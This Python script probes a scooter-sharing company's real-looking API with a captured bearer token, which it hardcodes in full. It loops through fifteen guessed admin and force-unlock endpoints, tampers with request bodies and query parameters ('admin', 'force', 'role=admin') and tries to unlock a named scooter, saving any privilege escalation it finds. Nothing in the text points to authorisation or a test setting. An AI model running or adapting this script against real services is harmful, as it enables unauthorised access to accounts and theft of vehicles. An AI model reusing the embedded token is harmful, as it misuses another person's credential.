#!/usr/bin/env python3
"""
Test Admin Endpoints with Existing Fresh Token
Use the fresh token we already captured to test admin endpoints
"""

import requests
import json
import os
import re

# API Configuration
BASE_URL = "https://api.knotcity.io"
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,
    "lng": 2.3522
}

# Use the fresh token we already have
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_admin_endpoints():
    """Test all possible admin endpoints with fresh token"""
    print("=" * 80)
    print("[ADMIN TEST] Testing admin endpoints with existing fresh token")
    print("=" * 80)
    print(f"[TOKEN] Using fresh token: {FRESH_TOKEN[:50]}...")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Admin unlock payload variations
    admin_payloads = [
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "force": True
        },
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "admin": True
        },
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "scope": "admin"
        },
        {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng'],
            "role": "admin"
        }
    ]
    
    # Test multiple admin endpoint variations
    admin_endpoints = [
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock",
        "/api/vehicles/admin/unlock",
        "/api/admin/unlock",
        "/api/application/vehicles/force-unlock",
        "/api/admin/vehicles/force-unlock",
        "/api/vehicles/force-unlock",
        "/api/emergency/unlock",
        "/api/admin/emergency/unlock",
        "/api/application/emergency/unlock",
        "/api/system/unlock",
        "/api/root/unlock",
        "/api/super/unlock",
        "/api/master/unlock"
    ]
    
    # Test with query parameters
    query_param_endpoints = [
        "/api/application/vehicles/unlock?admin=true",
        "/api/application/vehicles/unlock?force=true",
        "/api/application/vehicles/unlock?scope=admin",
        "/api/application/vehicles/unlock?role=admin",
        "/api/application/vehicles/unlock?permission=admin",
        "/api/application/vehicles/unlock?level=admin",
        "/api/application/vehicles/unlock?type=admin",
        "/api/application/vehicles/unlock?mode=admin",
        "/api/application/vehicles/unlock?access=admin",
        "/api/application/vehicles/unlock?privilege=admin"
    ]
    
    admin_success = False
    successful_endpoints = []
    
    print("\n[TESTING] Direct admin endpoints...")
    for endpoint in admin_endpoints:
        for i, payload in enumerate(admin_payloads, 1):
            print(f"\n[ADMIN TEST] Endpoint: {endpoint}")
            print(f"   Payload {i}: {json.dumps(payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=payload,
                    timeout=15
                )
                
                print(f"   Status: {response.status_code}")
                print(f"   Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"[SUCCESS] SXB306 ADMIN UNLOCKED via {endpoint}!")
                    print("[CRITICAL] ADMIN PRIVILEGE ESCALATION CONFIRMED!")
                    admin_success = True
                    successful_endpoints.append({
                        "endpoint": endpoint,
                        "payload": payload,
                        "response": response.text
                    })
                    break
                elif response.status_code == 401:
                    print(f"[ERROR] Token expired/invalid")
                    return False, []
                elif response.status_code == 403:
                    print(f"[ERROR] Admin permission denied")
                    continue
                elif response.status_code == 400:
                    print(f"[ERROR] Bad request - trying next payload...")
                    continue
                else:
                    print(f"[ERROR] Unexpected response: {response.status_code}")
                    continue
                    
            except Exception as e:
                print(f"[ERROR] Request failed: {e}")
                continue
        
        if admin_success:
            break
    
    if not admin_success:
        print("\n[TESTING] Query parameter admin endpoints...")
        base_payload = {
            "serial_number": SXB306_SCOOTER['serial'],
            "lat": SXB306_SCOOTER['lat'],
            "lng": SXB306_SCOOTER['lng']
        }
        
        for endpoint in query_param_endpoints:
            print(f"\n[ADMIN TEST] Endpoint: {endpoint}")
            print(f"   Payload: {json.dumps(base_payload, indent=2)}")
            
            try:
                response = requests.post(
                    f"{BASE_URL}{endpoint}",
                    headers=headers,
                    json=base_payload,
                    timeout=15
                )
                
                print(f"   Status: {response.status_code}")
                print(f"   Response: {response.text}")
                
                if response.status_code == 200:
                    print(f"[SUCCESS] SXB306 ADMIN UNLOCKED via {endpoint}!")
                    print("[CRITICAL] ADMIN PRIVILEGE ESCALATION CONFIRMED!")
                    admin_success = True
                    successful_endpoints.append({
                        "endpoint": endpoint,
                        "payload": base_payload,
                        "response": response.text
                    })
                    break
                elif response.status_code == 401:
                    print(f"[ERROR] Token expired/invalid")
                    return False, []
                elif response.status_code == 403:
                    print(f"[ERROR] Admin permission denied")
                    continue
                elif response.status_code == 400:
                    print(f"[ERROR] Bad request - trying next endpoint...")
                    continue
                else:
                    print(f"[ERROR] Unexpected response: {response.status_code}")
                    continue
                    
            except Exception as e:
                print(f"[ERROR] Request failed: {e}")
                continue
    
    return admin_success, successful_endpoints

def test_regular_unlock_for_comparison():
    """Test regular unlock for comparison"""
    print("\n" + "=" * 80)
    print("[COMPARISON] REGULAR UNLOCK TEST")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    regular_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng']
    }
    
    print(f"[REGULAR TEST] Trying regular unlock payload:")
    print(f"   {json.dumps(regular_payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=regular_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] SXB306 REGULAR UNLOCK SUCCESSFUL!")
            print("[CRITICAL] VULNERABILITY CONFIRMED!")
            return True
        elif response.status_code == 401:
            print(f"[ERROR] Token expired/invalid")
            return False
        elif response.status_code == 403:
            print(f"[FAILED] Regular unlock failed: 403")
            return False
        else:
            print(f"[ERROR] Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False

def test_token_validity():
    """Test if the token is still valid"""
    print("\n" + "=" * 80)
    print("[TOKEN VALIDITY] Testing token validity")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test with a simple endpoint
    try:
        response = requests.get(
            f"{BASE_URL}/api/application/users",
            headers=headers,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
        if response.status_code == 200:
            print(f"[OK] Token is valid and working")
            return True
        elif response.status_code == 401:
            print(f"[ERROR] Token expired/invalid")
            return False
        else:
            print(f"[INFO] Token status: {response.status_code}")
            return True
            
    except Exception as e:
        print(f"[ERROR] Token validation failed: {e}")
        return False

def main():
    print("=" * 80)
    print("[+] ADMIN TEST WITH EXISTING FRESH TOKEN")
    print("=" * 80)
    print("[!] This script tests admin endpoints with the fresh token we already captured.")
    print("[!] Theory: Fresh token might have admin privileges or bypass restrictions.")
    print("=" * 80)
    
    # First test token validity
    if not test_token_validity():
        print("[ERROR] Token is not valid. Please capture a fresh token first.")
        return
    
    # Test admin endpoints
    admin_success, successful_endpoints = test_admin_endpoints()
    
    # Test regular unlock for comparison
    regular_success = test_regular_unlock_for_comparison()
    
    # Save results
    results = {
        "timestamp": "2025-01-03T01:00:00Z",
        "token": FRESH_TOKEN,
        "admin_success": admin_success,
        "regular_success": regular_success,
        "successful_endpoints": successful_endpoints
    }
    
    with open('ADMIN_TEST_RESULTS_EXISTING_TOKEN.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print("\n" + "=" * 80)
    print("[RESULTS] ADMIN TEST WITH EXISTING FRESH TOKEN")
    print("=" * 80)
    
    if admin_success:
        print("[CRITICAL] ADMIN PRIVILEGE ESCALATION SUCCESSFUL!")
        print(f"[SUCCESS] {len(successful_endpoints)} admin endpoint(s) worked:")
        for endpoint_info in successful_endpoints:
            print(f"   - {endpoint_info['endpoint']}")
        print("[WARNING] Fresh token bypassed admin restrictions!")
    else:
        print("[OK] Admin privilege escalation blocked even with fresh token")
    
    if regular_success:
        print("[CRITICAL] Regular unlock successful with fresh token!")
    else:
        print("[OK] Regular unlock properly blocked")
    
    print(f"\n[SAVED] Results saved to ADMIN_TEST_RESULTS_EXISTING_TOKEN.json")
    print("=" * 80)

if __name__ == "__main__":
    main()
